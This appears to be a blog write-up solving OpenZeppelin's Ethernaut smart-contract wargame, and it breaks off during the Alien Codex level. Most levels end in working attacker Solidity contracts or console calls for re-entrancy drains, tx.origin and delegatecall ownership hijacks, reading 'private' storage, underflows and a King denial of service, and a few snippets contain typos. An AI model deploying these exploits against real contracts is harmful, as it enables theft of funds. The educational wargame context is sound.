<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Openzeppelin Ethernaut - Full Writeup</title><link rel="preload" as="font" href=""/><meta name="description" content="thernaut Full Writeup](#ethernaut-full-writeup)
  - [Hello Ethernaut](#hello-ethernaut)
  - [Fallback](#fallback)
  - [Fallout](#fallout)
  - [CoinFlip](#coinflip)
  - [Telephone](#telephone)
  - [Token](#token)
  - [Delegation](#delegation)
  - [Force](#force)
  - [Vault](#vault)
  - [King](#king)
  - [Re-entrancy](#re-entrancy)
  - [Elevator](#elevator)
  - [Privacy](#privacy)
  - [Gatekeeper One](#gatekeeper-one)
      - [gateOne](#gateone)
      - [gateThree](#gatethree)
      - [gateTwo](#gatetwo)
  - [GateKeeper Two](#gatekeeper-two)
      - [GateOne](#gateone-1)
      - [GateTwo](#gatetwo-1)
    - [gateThree](#gatethree-1)
  - [Naught Coin](#naught-coin)
  - [Perservation](#perservation)
  - [Recovery](#recovery)
  - [Magic Number](#magic-number)
  - [Alien Codex](#alien-codex)
  - [Denial](#denial)
  - [Shop](#shop)
  - [Dex](#dex)
  - [Dex 2](#dex-2)
  - [Challenge Description](#challenge-description)
      - [Solidity Contract for test and for the token3](#solidity-contract-for-test-and-for-the-token3)
  - [PuzzleWallet](#puzzlewallet)
  - [Motorbike](#motorbike)

## Hello Ethernaut

&gt; This challenge is a warm-up challenge and for those who doesn&#x27;t know how to interact with contracts using the js libraries.

```js
await contract.info()
await contract.info1()
await contract.info2(&quot;hello&quot;)

await contract.infoNum()
await contract.info42()

await contract.theMethodName()
await contract.method7123949()

// Here we are asked to submit the password that we know to authenticate but we didn&#x27;t interact with any passwords. A quick guess, password is a public field in the contract 

const password = await contract.password() // We fetch the values of variables as methods

await contract.authenticate(password);
```

Challenge solved ✅

## Fallback

**Challenge description**

&gt; You will beat this level if
    - you claim ownership of the contract
    - you reduce its balance to 0

--------
**Analysis**

a quick run through the code of the challenge, I extracted the valuable methods and variables we will be using.

![Contribute Method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138025/c323ec3e81e2a66f654995386118d6903a9758b1fa877d780d521e99db208afb_eejfmr.png)  

Here we see how the contribute method works. Pretty simple we send ether and it&#x27;s recorded for us.

![fallback method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/90f03025307c6a50bdc53647caac2e2e1e9711fb1fafb173d6765a8668e4bedf_hox5ei.png)  

Okay the **receive** part. As we see here we are defining a function but without the *function* keyword. That&#x27;s because the receive function is a *fallback* function, let&#x27;s say some kind of function that should be existing in all smart contracts but here we are overriding its behaviour.
Actually, since the version 0.6.0 we got two functions to handle fallback cases. *fallback* and *receive*. a little explainer of how they are called ...

```js
// Explainer from: https://solidity-by-example.org/fallback/
    // Ether is sent to contract
    //      is msg.data empty?
    //          /   \ 
    //         yes  no
    //         /     \
    //    receive()?  fallback() 
    //     /   \ 
    //   yes   no
    //  /        \
    //receive()  fallback()
```

So what we need to do here actually ?

1. Contribute so we have a contribution **value non nul**.
2. Trigger the fallback function by sending ether to the contract.

-----
**Exploitation**

```js
await contract.contribute({value:toWei(etherValue)});
await contract.sendTransaction({value:toWei(etherValue)});
```

Challenge solved ✅

## Fallout

Constructors in solidity are quite a story and they were the source of a big -----
**Exploitation**.
Here the challenge is quite simple. All we have is to notice the typo in the constructor function name which makes it a normal **public** function that we can call to get the contract ownership.

```js
await contract.Fal1out();
```

## CoinFlip

`Randomness is just a myth.`

**Challenge description**

You&#x27;ll need to use your psychic abilities to guess the correct outcome 10 times in a row.

--------
**Analysis** 

In blockchain randomness is just quite the issue, not only in the blockchain really that implies for all computers systems and is due to the way we are trying to make deterministic systems have an deterministic results. The matter for the blockchain is its transparency making even finding a seed a quite impossible.

Here we see the function of coinFlip
![CoinFlip method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/a4a71eed827fde83d6d4140e52f376aa5b2cbea20f1587a156118f7e65fa480b_czfni3.png)  

our seed is actually `block.number` but we can know this value easily from the blockchain. So all we have is create a contract that feeds the flip function the values she expect 😈

-----
**Exploitation** 

![CoinFlip Attack](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/1c39007c6e59a8ac5b4a23a23c83efc645c1ed4665dcc7686fe83f28d39bb34a_saizwt.png)  

Now all we have to do is call the contract method 10 times.

## Telephone

**Challenge description**

- Claim ownership of the contract.

--------
**Analysis**

![Telephone method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138025/d794be949c9e5c756d0940618ff646c8dd477ab3f134d3973baac079ec09be4f_xqkdnr.png)  

Here we see the condition being checked is as simple as `tx.origin != msg.sender` but what does `tx.origin` means ?
Actually `tx` is a global variable in the smart contract ( same as js global variables ) and it means the transaction that have been initiated on the function call.
When we call a method from web3 actually we are interacting directly with the smart contract so it will initiate the transaction but when we call a contract from another contract the `tx.origin == caller.address` 

-----
**Exploitation**

Based on our analysis we understand all we need is to call the function from an evil contract and pass our address as parameter.

```js
interface TelephoneInterface{ 
    function changeOwner(address _owner) external; 
}

contract EvilContract { 
    
    TelephoneInterface victimContract;
    contructor(address victimAddress) public {
        victimContract = TelephoneInterface(victimAddress);
    }

    function becomeOwner(address newOwner){
        victimContract.changeOwner(newOwner);
    }
}
```

Challenge solved ✅

## Token

--------
**Analysis**

This challenge is about **unsigned integers**. We need to be extra duper careful when handling them as they *overlap*. What does that mean ? 

```c#
uint8 X= 255;
X=X+1 // X = 0 ;
```
Now you see it.

![Token method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/61490e01f7f4c0dcaaa9366ce4607e17714ff36452e562e06c8bcd0d048c335a_df2hde.png)  

```js
 require(balances[msg.sender] - _value &gt;= 0); // How about we pass a big value to this poor unsigned balances[msg.sender] ?
```

-----
**Exploitation**

We got 20 tokens, So I will be generous and give more than I own.

```js
 await contract.transfer(player,21);
```

Challenge solved ✅

## Delegation

**Challenge description**

The goal of this level is for you to claim ownership of the instance you are given.

--------
**Analysis** 

Here we are exposed to the `delegateCall` function. If you don&#x27;t know what this function does I will try to sum it up. It&#x27;s a low level way to call a method of a contract ( in our case `pwn` ) in the context of another, it means it gets the storage values and global ones of the contract who called `delegateCall`.

![Delegation pwn](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/2549219ff5c11b36a370c12f1dfd8326925489a9207074b29dfd7f83621353bc_m6k8pd.png)  

![Delegation fallback](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138019/7358cfd1b967281caa40f09ba74e6e9be2e11dce5bb005022749902ece0d530a_vpu7ji.png)  

Okay so what is *msg.data* ?
msg.data can be the function selector with the parameters in a bytes encoded format

-----
**Exploitation**

I wrote a contract to get the bytes, we can also use `web3.eth.abi.encodeFunctionCall` from the console.

```js
contract Utility {
     function pwnEncoded () public pure returns (bytes memory) {
      return abi.encodeWithSignature(&quot;pwn()&quot;); 
    }
```

```js
await contract.sendTransaction({data:valueFromContract});
```
Challenge solved ✅

## Force

We will learn another capability of smart contracts which sometimes became problematic if we rely on it.

**Challenge description**

The goal of this level is to make the balance of the contract greater than zero.

--------
**Analysis**

Nothing to see there the contract is pretty empty. But a big security consideration that no contract can prevent incoming ethers from the blockchain. All we can do is not rely the contract balance in our contract logic.

[Link for more informations](https://docs.soliditylang.org/en/develop/security-considerations.html)

So what is the method to send ethers to an empty contract or let&#x27;s say a contract that has logic which tries to prevent incoming ethers. A quick googling and I came to the answer it&#x27;s the method `selfdestruct(address)`

&gt; The only way to remove code from the blockchain is when a contract at that address performs the selfdestruct operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state

[Docs Link](https://docs.soliditylang.org/en/develop/introduction-to-smart-contracts.html?highlight=selfdestruct#deactivate-and-self-destruct)

We got everything we need now let&#x27;s hack !

-----
**Exploitation**

```js
contract EvilContract { 
    // payable public so we can send it some ether to pass.
    function forceSendBySacrifice(address victimAddress) payable public {
        selfdestruct(_address);

    }
}
```

## Vault

`transparency has no limits`

**Challenge description**

Unlock the vault to pass the level!

--------
**Analysis**

![Vault storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/e9446fa1dc73bdd6238eccf71218b163311ff773cb9ef02980f39ab6443d8e0a_auuwqt.png)  
![Vault method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/109330cb4bbe2a93530a4c5a6bda285a392f0d2878464d1a581cc5b240a4a3ee_somrgz.png)  

The private keyword of solidity is quite tricky. Private variables limit their scopes to the contract so they can&#x27;t be viewed or accessed by other **contracts** logic. However anyone can view the variable values. This challenge is simple and all we have to understand is the storage is a key value store where the keys are from 0 to 2^256.

Here we can see got two storage variables `locked` and `password`. I highly encouraging reading the docs [Storage solidity Docs](https://docs.soliditylang.org/en/develop/internals/layout_in_storage.html?highlight=storage) to understand how these variables are layed out.

bytes32 will take a whole slot so it can share the slot with locked. We will have then :

*slot0*  `locked`
*solt1*  `password`

-----
**Exploitation**

```js
 const password = await web3.eth.getStorageAt(address, 1);
 await contract.unlock()
```

Challenge solved ✅

## King

**Challenge description**

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

--------
**Analysis**

![King method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138016/26bbecde7b1eacd1313c83ad3cd9b8dc4aa55e3dacc9e5acf006ef155bcbc49c_x8mhfi.png)  

Pretty interesting, at first sight you might find this function unbreakable ( as I did ). But then a good look to the transfer method. I was thinking in term of a user who will interact with this contract. How about another contract ?
If we go back to the `fallback` challenge we talked about *fallback* methods. Here when we call `transfer` a callback function of the contract to whom we are transferring funds to will be triggered.

-----
**Exploitation**

1. Make our contract the king.
2. Our contract now revert the transaction and won&#x27;t step down from the throne 😈.

```js
contract EvilContract { 

    function becomeKing(address victimAddress) public payable { 
        victimAddress.call{value:1000000000000000000}(&quot;&quot;);
    }

    function() external payable { // fallback function definition
        revert(&quot;The kingdom is mine now !&quot;);
    }
}
```

Challenge solved ✅

## Re-entrancy

**Challenge description**

The goal of this level is for you to steal all the funds from the contract.

--------
**Analysis**

A quick read about Re-entrancy attack is all we need: [HackerNoon Article](https://hackernoon.com/hack-solidity-reentrancy-attack).

![Reentrancy method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138011/6b9b88336f13d99f52296f5874086643de346fe2aa6dbd66098162a244b11b6c_ztdmmm.png)  

So he is actually our balance after the call that&#x27;s all we need !

-----
**Exploitation** 

```js
interface Reentrance {

    function donate(address _to) external payable;
    function withdraw(uint amount) public;
}

contract EvilContract {
    Reentrance victimContract;
    address victimAddress;
    uint donatedValue;

    constructor(address _victimAddress) public payable {
        // Set our victim contract, fund the contract.
        victimContract = Reentrance(_victimAddress);
        victimAddress= _victimAddress
    }

    function attack(uint _donatedValue) public {
        victimContract.donate.value(address(this),{value:_donatedValue});
        victimContract.withdraw(_donatedValue);
        donatedValue=_donatedValue
    }

    function() public payable {
        // Receiver for funds withdrawn by the attack
            if(victimAddress.balance&gt;= donatedValue )
            victimContract.withdraw(msg.value);
        }
}
```

Now we should just do some arithmetic to clear all the funds and not having to donate again and withdraw. If we have 1 ether as initial balance keep it to multipliers of 10 and so on.

Challenge solved ✅

## Elevator

`with trust, everyone can get to the last floor`

**Challenge description**

This elevator won&#x27;t let you reach the top of your building. Right?

--------
**Analysis**

![Elevator method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138015/32f18465b7eeaabaeced84613e4e573847463c7b34aefd6d467fdd9d9f04d851_rpolcp.png)  
This function uses the method the msg.sender to know if the floor is accessible or not. The problem here is :

1. `Elevator` contract has no control over the logic of the `Building` contract.
2. The `goTo` function is actually `public` which makes it possible to have some state changes inside it.

And all we need is to make the isLastFloor function returns false at first so we get inside the if block and true to set top.

-----
**Exploitation**

```js
interface Elevator { 
 function goTo(uint _floor) external;
}

contract EvilBuilding { 
    uint count= 0; 
    function isLastFloor(uint) external returns (bool){ 
        count ++ ; 
        return count%2==0 ? true : false; // The first time will pass false the second true
    }

    function callAttack(address ElevatorAddress) public {
        Elevator elevatorContract = Elevator(ElevatorAddress);
        elevator.goTo(10); // put any number here really
    }
}
```

Challenge solved ✅

## Privacy

**Challenge description**

The creator of this contract was careful enough to protect the sensitive areas of its storage.
Unlock this contract to beat the level.

--------
**Analysis**

![Privacy storage](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ff541ef577bf0b185d9bd2266bc82b7cef5b80e9c30195d89a0ba04fb1f9e21e_sfqspe.png)  

As we said before, every variable in the storage can be accessed all we have to do is find which slot it&#x27;s residing in. Same applies here.

We got the following:

```js
// [0] bool locked
// [1] uint256 ID
// [2]      awkwardness | denomination | flattening
// arrays start always in a new slot 
// [3] bytes32 data[0]
// [4] bytes32 data[1]
// [5] bytes32 data[2]
```

-----
**Exploitation**

We know the position of the password . We can unlock the contract. 

```js
await contract.getStorageAt(INSTANCE_ADDRESS,5);
/// We can manually extract the least significant 16 bytes or simply write a util contract like below
```

```js
contract Utils { 
    function get16Bytes(bytes32 value) public returns (bytes16) {
        return bytes16(value);
    }
}
```

```js
await contract.unlock(Returned_Value);
```

Challenge solved ✅

## Gatekeeper One

This challenge gave me hard time, two days to solve it but I learnt a lot during those days.

**Challenge description**

Make it past the gatekeeper and register as an entrant to pass this level.

--------
**Analysis**

Okay so we got three modifiers, each one represents a `barrier` we need to break through. I will be going through each modifier one by one.

#### gateOne

Looking to this gate it sounds really familiar

![GatekeeperOne gateOne](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/06809c8478417e00449644e9239e81acbb43073a701381acb4adf9097c50552e_eyyyd2.png)  

It implies that we should be using another contract to interact with the gate.

#### gateThree

I will leave gateTwo the last one as it&#x27;s the most annoying ( not hard ) one to pass.

![GatekeeperOne gateOne](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/556142b2c2f87864fc6a219ce8393b52105c58b94b119105918d8c8c543abd1a_bg3gdk.png)  

We got three conditions to pass and lot of type conversion 🙂.It&#x27;s time we learn how conversions works in solidity [Solidity Type conversions](https://docs.soliditylang.org/en/v0.6.0/types.html?highlight=conversions#explicit-conversions)

Let&#x27;s go through each condition one by one

1. First condition

```js
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);
```

Let&#x27;s say uint64(_gateKey) = 0x???????????????? and now we neeed to find the bytes we have 

*uint16 == uint32* which translates to 0x0000AAAA== 0xAAAA. =&gt; uint64(_gateKey) = 0x????????0000AAAA

2. Second Condition

```js
require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);
```

**uint32 != uint64 `` which translated to 0x????????0000AAAA != 0x0000AAAA ( the value we found in condition 1 ) so here we need make sure the `?` are different than zeros.

3. Last condition

```js
require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);
```

It just tells us that the `AAAAA` should be derived from the `tx.origin` value.

Okay to sum it up we have the format of `0xFFFFFFFF0000FFFF` for our contract. so we can get the values by using a logical operator `&amp;`.

#### gateTwo

![Gateekeeper gateTwo](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138026/ed529917c8ae75cb2c5878f6bd67665021b8843e8d04305cf5556944dd3a45bf_f9rwex.png)  

what is the `gasleft` function ?
the gasleft function tells us how much gas is left. As we know each transaction needs a certain amount of gas that we pay for. But do you know how the amount of gas if calculated ?
we can check the website [Opcodes, EVM](https://www.ethervm.io/), actually each opcode has its fixed consumption of gas. We are here determined to get the value of the gasleft when we arrive at the condition and make sure it can be divided by that number.

-----

**Exploitation**

1. We should call the contract from our `Evil Contract` so we bypass the first gate
2. We should make sure the key adhere to the key format we found.
3. We need to pass a gas value that passes the condition.
    &gt; However when searching for that gas value we can
        1. Calculate the gas consumed till the call of the condition check by using the debugger by summing the cost of opcodes :)
        2. Use the debugger to check the gas value at the condition check.
        3. Just don&#x27;t, if you are impatient brute force it. That&#x27;s what I did when I got low on caffeine and the music stopped.

![Debugging interface](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/18f23b5aad25da24fa6fbdc8842fb1ee0568daa3ac723a166802b0cc2dd2518d_yg3ech.png)  

So here is the final contract

```js
contract EvilContract { 
    function getKey() view public returns (bytes8){ 
        return bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF; // The first time will pass false the second true
    }
    function callAttack(address gateAddress, uint baseGasValue) public returns (bool) {
        bytes8 gateKey = getKey();
        uint i;

        for (i=0;i&lt;300;i++)
        {
        (bool result,) =  gateAddress.call{gas:gasValue}(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, baseGasValue+100+8191*4));
        if(result) return result;
        }
        return false;
    }
}
```

Happy hacking ! You may rest traveler , The next gate will be some kind of a boss fight.

Challenge solved ✅

## GateKeeper Two

&gt; Time to delve deep in the ethereum blockchain

**Challenge description**

I will sum up we need to pass the gate and learn many things.

--------
**Analysis**

As usual here we got three modifiers to pass. We will be going through each modifer one by one from the easiest to the hardest.

![Gatekeeper contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/193982e4a19ec767e0759ab2e9adc2e16865502b0625e6eb22fc0a39e11418d7_k0ahq6.png)  

#### GateOne

```js
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```

Okay we need to call the `GatekeeperTwo` from another contract.

#### GateTwo

```js
modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }
```

Oww a new keyword `assembly` what&#x27;s that ? 
![Solidity Documentation Screenshot - assembly keyword](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138017/2cb6f44375d3fb1a39d4e147414218e8f9d1b7fe5a98c873c4469082b7fba674_qlucds.png)  

So we have now a clear idea of the assembly keyowrd and it&#x27;s capabilities, that might remind you a little bit of how the `C` language works ! 
For the `extcodesize` the code snippet below taken from the docs explains it all.

```js
// retrieve the size of the code, this needs assembly
            let size := extcodesize(addr)
```

For the `caller()` it returns the address of the caller. it might be an account or another contract. Actually, this `consensys` which a great resource for smart contract security explains it all .

&gt; the idea is straightforward: if an address contains code, it&#x27;s not an EOA but a contract account. However, a contract does not have source code available during construction. This means that while the constructor is running, it can make calls to other contracts, but extcodesize for its address returns zero.

[Consensys Page](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/)

So we now know to pass this gate we need to call the method `enter` in the constructor of our *EvilContract*

### gateThree

This gate resembles gateThree of *GateKeeper One* it&#x27;s about performing the right logical operations and finding the gateKey.

```js
 modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }
```

Let&#x27;s evalulate the *right* side of the equality. Remember the *Token* Challenge ? yes but now this dangerous manipulation of unsigned integer in intended and it gives us the value `0xFFFFFFFF`.
For the *left* side of the equality we got an **XOR** operation. **XOR** verifies if the bits in the same position or not if they are it results in 1 otherwise in 0. Let&#x27;s ignore the conversion it won&#x27;t change anything actually because we can reverse it to get the _gateKey later.

So the equation we have : 

**A** =  `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`
**B** = `uint64(_gateKey)`
**C** = `uint64(0) - 1`

Here is what we need to do ! Read carefully this wikipedia page if you need to understand how it works on bit level. [Wikipidea XOR Article](https://en.wikipedia.org/wiki/XOR_cipher)
![XOR Wikipedia Screenshot](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/01a9f0d0791a8896c4b6109abc576acbfbccade8b44817fa1abd2f245eb99700_lii5bn.png)  

`A ^ B = C , B = ? ==&gt; B = A ^ C`
Which translates to
`gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1);`

-----
**Exploitation**

Let&#x27;s craft our *EvilContract*

```js
contract EvilContract { 

    function getOperationResult() public pure returns (uint64){
        uint64 x =0; 
        return x - 1;
    }

   function getGateKey() public view returns (bytes8){ 
       uint64 x = getOperationResult();
     return   bytes8(x ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
   }

   
   constructor(address gateAddress) public {
       GateTwo gateTwoContract= GateTwo(gateAddress);
       bytes8  gateKey =getGateKey();
      bool state= gateTwoContract.enter(gateKey);
     require(state);
   }
   
}
```

We pass our instance address to the constructor.

Challenge solved ✅

&gt; I was late, I couldn&#x27;t join theCyber club 🥲

## Naught Coin

&gt; RTFM

**Challenge description**

NaughtCoin is an ERC20 token and you&#x27;re already holding all of them. The catch is that you&#x27;ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.
~ A bunch of useful references we will be going through in analysis

--------

**Analysis**

![Naught Coin contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/264f925aeaf5e08d9758746a1f9774a6a2194df257f8dd0a92a00b4b820881d7_dm5hut.png)  

The contract is an implementation of the ERC20 specification.

*How it works ?*
We create tokens that can be traded between the users of our contract. Our contract is responsible for setting the total supply and modifying it, keeping track of users balance and one other useful feature allowing and disallowing the ones who can spend/trade tokens from each account remember that it will be useful.

The logic is flawless and the condition cannot be bypassed.

```js
      require(now &gt; timeLock);
```

But our contract is inheriting from the ERC20 of openzeppelin and we can see something is wrong.

![ERC20 openzeppeling](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138012/1ec4088e0ffadccfa057b1c022c8d4fb51d1475ef0e0018a4e32b7b1beab92e0_iagggl.png)  

We got another method for transferring tokens ! cool but wait *he caller must have allowance for ``from``&#x27;s tokens of at least amount* so msg.sender needs to have an allowance of the amount.
and allowance can be set by calling..

![ERC20 openzeppelin](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/47b72aa9c7060cd02c197e1de9e50fb4f53f3b5a7d7e6e9f0c946807ec700df9_gsugja.png)  

Okay we got everything let&#x27;s -----
**Exploitation** it

**Further Reading** [ERC20 API: An Attack Vector on Approve/TransferFrom Methods](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit#)

-----
**Exploitation**

```js
const balance = (await contract.balanceOf(player)).toString();
await contract.approve(player,balance);
await contract.transferFrom(player,ANY_OTHER_ADDRESS,balance);
```

Challenge solved ✅

## Perservation

**Challenge description**

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
The goal of this level is for you to claim ownership of the instance you are given.

--------
**Analysis**

I explained well the `delegateCall` function before and how it runs in the caller context but I left the context a little blurry so let&#x27;s define it.
The context here is the storage variables or let me call them `state variables` they are defined in the contract address and the called contract will handle them *blindly* which means he will assume that

*Storage layout of the caller*  == *Storage layout of the callee*

Let&#x27;s look to our contract now.

![Perservation contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/0cded2638e39c98dee9e35690675e5a299c3628f81c9bdb1375a708b5e209098_ecu1g4.png)  

The interesting bits are : 

```js
  //inside the library contract
  uint storedTime;  

   function setTime(uint _time) public {
    storedTime = _time;
  }
```

```js
 // inside the vulnerable contract
 address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
```

I guess you got an idea what will happens with the delegateCall ? `storedTime` is actually our `timeZone1Library` variable they are both at `slot[0]` of the storage so it will be set instead. 
and the `setSecondTime` does the same thing as the `setFirstTime` in this case.

-----
**Exploitation**

1. Create an evil contract that implements `setTime(uint)` and has the same storage layout as the vulnerable contract ( by declaring the same variables in the same order 😄)
2. call the `set_X_Time` of the vulnerable contract by passing uint(evilcontractAddress) as paramater
3. call the method again now our evilContract function will be triggered to set owner = ourAccount;

Let&#x27;s craft the *EvilContract*

```js
contract EvilContract {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  
  // These variable are useless because we won&#x27;t to ensure that the owner is in slot[2] 
  // we don&#x27;t really care about the slots that comes after
  uint storedTime;
  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));

   function setTime(uint _time) public {
    owner = 0x84e7a3679A82C2766Ff8382862ab883FF9460307;
   }

   function getParam() view public returns (uint){
        return uint(address(this));
   }
}
```

Challenge solved ✅

**Further Reading** [Preventing Smart Contract Attacks on Ethereum — “DELEGATECALL”](https://betterprogramming.pub/preventing-smart-contract-attacks-on-ethereum-delegatecall-e864d0042188)

## Recovery

&gt; Forensics in the blockchain world !

**Challenge description**

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

--------
**Analysis**

**the problem**

```js
    new SimpleToken(_name, msg.sender, _initialSupply);
```

&gt; A contract can create other contracts using the new keyword. The full code of the contract being created has to be known when the creating contract is compiled so recursive creation-dependencies are not possible.

[Solidity Docs - New keyword](https://docs.soliditylang.org/en/v0.8.15/control-structures.html?highlight=new%20keyword#creating-contracts-via-new)

the `new` keyword returns the address of the created contract but here it&#x27;s not saved and there is no way to retrieve it from the contract state. But we are in the blockchain world where transparency rules ! All transactions are saved and we can actually find the created contract.

-----
**Exploitation**

1. Go to [Etherscan](https://rinkeby.etherscan.io/)
2. Search for your instance address
3. You will find something similar to this, click it !
![Recovery instance contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/93668187b141f813b187b92cf0e33ff963269e40cd11b36386300e201af120c9_atmryc.png)  

4. Check the balance to be sure that it&#x27;s the created contract.

 ![Recovery created contract](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/106328b15039a3d164b45720563251c6f628e2907732a9b997514327aac3f457_vnq6mh.png)  

6. call the destroy function with your wallet address as paramater

Here is a simple contract to call the destroy function :

```js
interface SimpleToken {
      function destroy(address payable _to) external ; 
}

contract Recover {

    function recoverFunds(address contractAddress, address payable myAddress) public {
        //  (bool success, ) = contractAddress.call(
        //     abi.encodeWithSignature(&quot;destroy(address payable)&quot;, myAddress));
        //  require(success);   

        // or a cleaner way 
        SimpleToken tokenContract = SimpleToken(contractAddress);
        tokenContract.destroy(myAddress);
    }

    function verifyBalance(address contractAddress) public view returns (uint){
        return contractAddress.balance;
    }
}
```

## Magic Number

**Challenge description**

&gt; To solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.
Easy right? Well... there&#x27;s a catch.
The solver&#x27;s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin&#x27; really really itty-bitty tiny: 10 opcodes at most.

--------
**Analysis** 

Writing Opcode instead of plain solidity.  **It&#x27;s not that hard right ?** *right?* 
Okay Let&#x27;s dive in one by one till we understand how everything works. I  will be writing some pseudo/solidity code for analogy.

```js
//
function whatIsTheMeaningOfLife(){
    return 42;
}

```

`a contract that responds to whatIsTheMeaningOfLife()` fallback function can answer that so let&#x27;s make things more simple

```js
function(){
    return 42;
}
```

Let&#x27;s translate it line by line to opcode. I found this magnificent reference [EtherVM](https://www.ethervm.io/#02). I really like the table view instead of navigating page by page through the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf).

```js
return 42; 
---------   
PUSH1 0x42 //  our value
PUSH1 0x80 //  memory position
MSTORE // stores the 42 into memory location 0x80
PUSH1 0x20 // the length of the value
PUSH1 0x80 // memory position ( again )
RETURN // returns (memory position , offset )  so we can calculate memoryPos+offset to get the value !

// *10 bytes total*
```

`PUSH1 VALUE` pushes a 1-byte value onto the stack.
`MSTORE` writes a (u)int256 to memory takes (offset,value) as args

&gt; The ethereum evm is a [Stack Machine](https://en.wikipedia.org/wiki/Stack_machine). args comes from the stack and return values are written into the stack.

&gt; In fact, Solidity uses the memory area between address zero and address 0x7F for internal purposes, and stores data starting at address 0x80. So initially, free memory starts at 0x80. To keep track of which memory can still be used and which memory areas are already in use [A deep-dive into Solidity – contract creation and the init code](https://leftasexercise.com/2021/09/05/a-deep-dive-into-solidity-contract-creation-and-the-init-code/)

Now we have to write opcodes for contract initialization. We should know how contract initialization works under the hood. First the bytes sent in the transaction can be divided into two *initialization opcodes* and *runtime opcodes*. The *initialization opcodes* are the one responsible for the creation of the contract by executing the constructor and copying the *runtime opcodes* into the memory because the *runtime opcodes* is the instruction that will be run in the contract (functions,modifiers etc). What we have defined above is the *runtime opcodes*. Let&#x27;s define our *initilization opcodes*

```js
// copy the runtime code into memory with codecopy(length,offset,dest)
PUSH 0x0a // 10 bytes of runtime opcodes
PUSH 0x0c // 13 bytes of initialization opcodes ( I didn&#x27;t guess it I have actually calculated after writing the whole thing )
PUSH 0x00 // memory offset
CODECOPY

// the initialization will stop at STOP or RETURN. for our case I will return the offset + length of the runtime code
PUSH 0x0a 
PUSH 0x00
RETURN
```

-----
**Exploitation**

To craft our payload we will convert the instruction to pure bytes. That&#x27;s fairly easy. We view [EtherVM](https://www.ethervm.io/#02) to view the bytes of each instruction and for the values we discard the `0x` (`0x0a` =&gt; `0a`)

                       [ Initialization bytes    |    Runtime bytes ]
So our final payload : `600a600c600039600a6000f3604260805260206080f3`

We open the console to create our contract and set it as the solver.

```js
const tx = await web3.eth.sendTransaction({from:player,data:&#x27;600a600c600039600a6000f3604260805260206080f3&#x27;});
await contract.setSolver(tx.contractAddress);
```

Challenge solved ✅

## Alien Codex

**Challenge description**

You&#x27;ve uncovered an Alien contract. Claim ownership to complete the level.

    Understanding how array storage works
    Understanding ABI specifications
    Using a very underhanded approach

--------
**Analysis**

First look at the contract code nothing comes to my mind. The Ownable contract is actually `openzeppelin` Ownable and I looked into its source code and the only useful thing I got is it saves `address owner`.

 Looking back to the challenge description I noticed the array in storage part. Dynamic structures have a length property that takes a normal position in the stack and from it we can look for the array data in the stack. We have to use `keccack265(length_position)` to find the first slot of array data.

So how can we -----
